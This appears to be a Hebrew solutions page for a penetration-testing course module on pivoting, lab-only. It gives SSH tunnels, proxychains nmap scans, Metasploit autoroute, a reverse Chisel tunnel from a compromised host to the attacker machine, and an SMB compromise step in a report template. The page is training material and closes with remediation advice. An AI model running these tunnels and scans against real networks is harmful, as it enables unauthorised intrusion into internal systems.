<div dir="rtl">

# ✅ פתרונות מלאים — מודול 12: Pivoting ותנועה רוחבית

> נסה לבד ב-[`missions.md`](missions.md) קודם. כל הפעולות על סביבות מעבדה חוקיות בלבד.

---

## חלק א' — זיהוי והבנה

**12.1** — **Lateral Movement** = מעבר בין מכונות באותה רשת (עם credentials). **Pivoting** = שימוש במכונה שנפרצה כנקודת מעבר לרשת אחרת. **Tunneling** = עטיפת תעבורה בפרוטוקול (SSH) לחציית גבולות.

**12.2**
```bash
ip a; ip route          # ממשקים ורשתות
arp -a                  # שכנים ידועים
cat /etc/hosts
netstat -rn             # טבלת ניתוב
```

**12.3** — Kali (`192.168.56.10`) → Pivot (`192.168.56.50` + `10.10.10.5`) → פנימית (`10.10.10.20`). Kali רואה רק את `192.168.56.x`; ה-Pivot רואה את שתי הרשתות; הפנימית לא נגישה ל-Kali ישירות.

---

## חלק ב' — SSH Tunneling

**12.4**
```bash
ssh -L 8080:10.10.10.30:80 user@192.168.56.50
# ב-Kali:  curl http://localhost:8080  = שרת פנימי
```

**12.5**
```bash
ssh -D 9050 user@192.168.56.50
# /etc/proxychains4.conf → socks5 127.0.0.1 9050
proxychains firefox http://10.10.10.30
```

**12.6**
```bash
proxychains nmap -sT -Pn -p- 10.10.10.30
```
`-sT` (TCP Connect) כי SYN scan לא עובר ב-SOCKS; `-Pn` כי ICMP ping לא עובר בפרוקסי (אחרת nmap ידלג על המכונה).

---

## חלק ג' — Metasploit ו-Chisel

**12.7**
```bash
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.30
msf > set PORTS 22,80,445,3389
msf > run
```

**12.8**
```bash
# Kali (שרת):
./chisel server -p 8000 --reverse
# על הקורבן:
./chisel client <kali-ip>:8000 R:socks
# ← SOCKS ב-127.0.0.1:1080; /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.30
```

**12.9** — **Double Pivot** = כשהמכונה הפנימית שפרצת רואה רשת **שלישית** שגם ה-Pivot הראשון לא רואה. משרשרים: מנהרה 1 (Kali→Pivot1), ואז מנהרה 2 (Pivot1→Pivot2) — למשל SSH -D דרך proxychains קיים, או Chisel שרץ על Pivot2 דרך המנהרה הראשונה.

---

## 🔴 אתגר מסכם — מבנה תיעוד

```markdown
# דוח Pivoting — רשת <לקוח>

## דיאגרמת רשת
Kali(192.168.56.10) → Pivot(192.168.56.50 / 10.10.10.5) → Target2(10.10.10.30)

## שיטה
1. פריצת Pivot דרך שירות web פגיע (מודול 9).
2. גילוי רשת פנימית: ip a → eth1 10.10.10.5/24.
3. מנהרה: ssh -D 9050 www-data@192.168.56.50.
4. proxychains nmap -sT -Pn 10.10.10.0/24 → מצא 10.10.10.30:445.
5. proxychains crackmapexec smb 10.10.10.30 → פריצה.

## המלצת תיקון
Network segmentation; חסום תעבורה מ-DMZ לרשת פנימית;
נטר SSH tunnels חריגים.
```

> עברת? חצית מ-DMZ לרשת פנימית — מיומנות ליבה. המשך ל[מודול 13](../13-active-directory/).

</div>
